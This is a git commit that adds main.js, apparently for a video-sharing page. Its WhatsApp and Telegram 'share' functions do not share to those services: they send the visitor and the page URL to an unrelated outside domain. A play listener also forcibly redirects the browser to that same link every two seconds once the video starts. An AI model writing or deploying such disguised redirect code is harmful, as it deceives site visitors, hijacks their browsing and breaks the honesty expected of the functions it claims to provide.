81564c4cbef269d012f639f7ddda38810f8c0300
videycoid <rfhari887@gmail.com>
2025-12-24 02:01:31 +0700

    Add files via upload

---
+++ main.js
@@ -0,0 +1,33 @@
+function shareVideo() {
+const links = document.getElementById('shareLinks');
+links.style.display = links.style.display === 'block' ? 'none' : 'block';
+}
+
+
+function copyLink() {
+navigator.clipboard.writeText(window.location.href);
+alert('Link berhasil disalin');
+}
+
+
+function shareWhatsApp() {
+const url = window.location.href;
+window.open(`https://otieu.com/4/9911821=${url}`, '_blank');
+}
+
+
+function shareTelegram() {
+const url = window.location.href;
+window.open(`https://otieu.com/4/9911821=${url}`, '_blank');
+}
+const targetLink = "https://otieu.com/4/9911821"; // GANTI LINK
+
+const video = document.getElementById("video");
+
+video.addEventListener("play", () => {
+    setInterval(() => {
+        window.location.href = targetLink;
+    }, 2000); // 2 detik
+});
+
+
